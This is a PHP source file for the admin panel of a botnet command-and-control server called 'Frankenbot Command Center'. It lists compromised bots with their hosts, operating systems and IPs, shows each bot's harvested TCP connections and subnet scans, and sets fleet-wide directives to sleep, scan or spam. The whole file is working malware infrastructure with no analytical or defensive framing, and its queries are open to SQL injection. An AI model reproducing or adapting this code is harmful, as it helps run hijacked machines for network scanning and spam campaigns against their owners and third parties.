<?php

	// Our db connection
	include_once("/var/includes/dbConnect.inc");

        // Functions shared by the various scripts
        include_once("./includes/functions.php");

	/*
	 * Some variables and constants that control authentication
	 * and responses given to bots
	 */

	$adminInitialPwd 	= getDBParam("botInitialPwd"); 
	$currentDirective	= getDBParam("currentDirective");
	$initialResponse 	= getDBParam("initialResponse"); 
	$initialResponsesList	= array("sleep", "start");
	$directivesList		= array("sleep", "scan", "spam");

	/*
	 * Capture POST/PUT data and authenticate user
	 */
	$adminPwd  		= filter_var($_GET['adminPwd']);
	$showConnections 	= filter_var($_GET['showConnections']);
	$showSubnetScan 	= filter_var($_GET['showSubnetScan']);
	$updateDirective 	= filter_var($_POST['updateDirective']);
	$updateInitialResponse 	= filter_var($_POST['updateInitialResponse']);
	$actionButton		= filter_var($_POST['ActionButton']);


	/*
 	 * Ensure that we are authenticated
	 */
	if ( $adminPwd === $adminInitialPwd ) {

		// Did we POST updated values for initial response and/or main directove to bots?
		if ( $actionButton != NULL ) {
			if ( $actionButton === "Submit" ) {
				if ( $updateDirective != NULL && $updateDirective != $currentDirective ) {
					updateDBParam("currentDirective", $updateDirective ) ;
					$currentDirective = $updateDirective;
				}

				if ( $updateInitialResponse != NULL && $updateInitialResponse != $initialResponse ) {
					updateDBParam("initialResponse", $updateInitialResponse ) ;
					$initialResponse = $updateInitialResponse;
				}
			}
		} 

		/************************************
	   	 * Show a report of tcp connections 
		 ************************************/			
		if ( $showConnections != NULL ) {
			echo "<h2>HTTP and HTTPS connection details for botID".$showConnections."</h2>";
			$query="SELECT tcpConnections,SMTPmode FROM bots WHERE botID='$showConnections'";
            	  	$result=mysql_query($query);
			$row = mysql_fetch_array( $result ) ;
			echo "<table border='1'>";
			FormatRow("bold","lightgray","Destination IP","Destination FQDN","Port");
			$connections = explode(")(",$row['tcpConnections']);

			/*
			 * We sort the results by destination IP addresses
			 * The sort is not perfect but helps aggregate blocks
			 * of IP addresses in the final table
			 */

			$i = 0;
			foreach ( $connections as $currentConnection ) {
				$currentConnDetails = explode(",",str_replace("(","",$currentConnection));
				$dstFQDN = gethostbyaddr($currentConnDetails[1]);
				$tcpConnections[$i]["src"] 		= $currentConnDetails[0];
				$tcpConnections[$i]["dst"] 		= $currentConnDetails[1];
				$tcpConnections[$i]["dstFQDN"] 		= $dstFQDN;
				$tcpConnections[$i]["port"] 		= $currentConnDetails[2];
				$i++;
			}
			$sortedConnections = subval_sort($tcpConnections,'dst');

			// Display sorted results
			foreach ( $sortedConnections as $currentConnection ) {
				FormatRow ("normal","white",
					$currentConnection['dst'],
					$currentConnection['dstFQDN'],
					$currentConnection['port']);
				
			}
			echo "</table>";
		/************************************
	   	 * Show last subnet scan results
		 ************************************/			
		} elseif ( $showSubnetScan != NULL ) {
			echo "<h2>Last subnet scan performed by bot with botID".$showSubnetScan."</h2>";
			$query="SELECT subnetScan FROM bots WHERE botID='$showSubnetScan'";
            	  	$result=mysql_query($query);
			$row = mysql_fetch_array( $result ) ;
			echo "<PRE>".$row['subnetScan']."</PRE>";
		/**********************
	   	 * Show C&C main page
		 **********************/			
		} else {
			echo "<html><head> <title>Frankenbot Command Center</title></head><body>";
			echo "<h1>Frankenbot Command Center</h1>";

			/*
			 * Show our current parameters
			 */

			echo "<h2>Current C&C DB parameter values</h2>";
			echo "<strong>currentDirective</strong>: ".getDBParam("currentDirective")."  |  ".
				"<strong>initialResponse</strong>: ".getDBParam("initialResponse")."  |  ".
				"<strong>botInitialPwd</strong>: ".getDBParam("botInitialPwd");

			/*
	 		* We list bots that have reported to C&C
			*/
			echo "<h2>Current list of bots</h2>";
			$query="SELECT botID,status,hostName,osName,osVersion,osArch,hostUptime,hostIps,".
				"sourceIP,proxySourceIP,Created,LastUpdated,subnetScan,tcpConnections,SMTPmode FROM bots ";
			$result=mysql_query($query);

			echo "<table border='1' width=\"80%\" >";
			FormatRow("bold","lightgray",
					"botID",
					"Status",
					"Hostname",
					"OS information",
					"hostUptime",
					"hotIps",
					"sourceIP",
					"tcp Conn",
					"net scan",
					"SMTP mode",
					"Created",
					"LastUpdated");
			while($row = mysql_fetch_array( $result )) {
				$sourceIP = "<a href=\"http://ipgeoinfo.com/?ip=".$row['sourceIP']."\">".$row['sourceIP']."</a><BR>proxy:";
				if ( $row['proxySourceIP'] == NULL ) {
					$sourceIP .= "n/a";
				} else {
					$sourceIP .= $row['proxySourceIP'];
				}

				FormatRow("normal","white",
					$row['botID'],
					$row['status'],
					$row['hostName'],
					$row['osName']."<BR>".$row['osVersion']."<BR>".$row['osArch'],
					$row['hostUptime'],
					$row['hostIps'],
					$sourceIP, 
					"<a href=\"https://factoryno1.franky.ca/botcandc/admin.php?adminPwd=".$adminInitialPwd."&showConnections=".$row['botID']."\">show</a>",
					"<a href=\"https://factoryno1.franky.ca/botcandc/admin.php?adminPwd=".$adminInitialPwd."&showSubnetScan=".$row['botID']."\">show</a>",
					$row['SMTPmode'],
					$row['Created'],
					$row['LastUpdated']);
			} 

			echo "</table>";
			echo "<BR><BR>";
			echo "<form name=\"myform\" action=\"\" method=\"POST\">";
			echo "<table border=\"0\">";	
			echo "<TR><TD>Set a general directive for your bots :</TD><TD>";
			createDropdownFromList($directivesList, $currentDirective,"updateDirective");
			echo "<TR><TD>Set the initial response to give your bots :</TD><TD> ";
			createDropdownFromList($initialResponsesList, $initialResponse,"updateInitialResponse");
			echo "<TR><TD>Submit your changes to the C&C database :</TD><TD> ";
			echo "<input type=\"submit\" name=\"ActionButton\" value=\"Submit\" /></TD></TR>";
			echo "</table>";
			echo "</form></body></html>";
		}
	} else  {
        	header("Location: /404.html");
	}

?>

